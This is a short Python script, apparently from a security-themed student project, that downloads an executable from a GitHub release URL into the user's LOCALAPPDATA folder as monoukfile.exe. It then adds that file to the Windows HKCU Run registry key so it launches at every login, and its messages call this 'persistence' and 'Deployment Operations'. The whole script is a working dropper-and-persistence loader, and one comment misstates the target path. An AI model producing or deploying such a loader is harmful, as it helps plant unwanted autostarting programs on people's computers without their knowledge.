import os
import sys
import winreg

# 1. Import your custom download function from download_file.py
# (This assumes download_file.py is in the same directory)
from download_file import download_file

# --- CONFIGURATION PARAMETERS ---
DOWNLOAD_URL = "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/download/v1.0.17/main.exe"
TARGET_DIR = os.environ.get("LOCALAPPDATA", r"C:\Users\Public")
TARGET_FILE = "monoukfile.exe"

# Correctly joins them to: C:\Temp\monoukfile.exe
TARGET_PATH = os.path.join(TARGET_DIR, TARGET_FILE)
REG_NAME = "monoukfile"


def add_to_registry_startup():
    """Adds the fully verified target executable path to Windows Startup Registry."""
    # Enforce surrounding quotes around path string to survive spacing constraints
    formatted_path = f'"{TARGET_PATH}"'
    registry_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    # Pre-flight check: Make sure file exists on disk before modifying the registry
    if not os.path.isfile(TARGET_PATH):
        print(f"[-] Error: Target binary not found at: {TARGET_PATH}")
        return

    try:
        # Open registry subkey under current user context with write access permissions
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
        
        # Write or update the specific entry key payload configuration
        winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, formatted_path)
        winreg.CloseKey(key)
        
        print(f"[+] Success: Applied persistence configurations to Registry!")
        print(f"    Key Entry Name: {REG_NAME}")
        print(f"    Target Path:     {formatted_path}")
    except Exception as e:
        print(f"[-] Failed to execute Registry alteration commands: {e}")


if __name__ == "__main__":
    print("=== Commencing Deployment Operations ===")
    
    # 2. Trigger your imported download function
    if download_file(DOWNLOAD_URL, TARGET_PATH):
        # 3. If download completes successfully, proceed with registry modifications
        add_to_registry_startup()
    else:
        print("[-] Deployment terminated due to download failure constraints.")
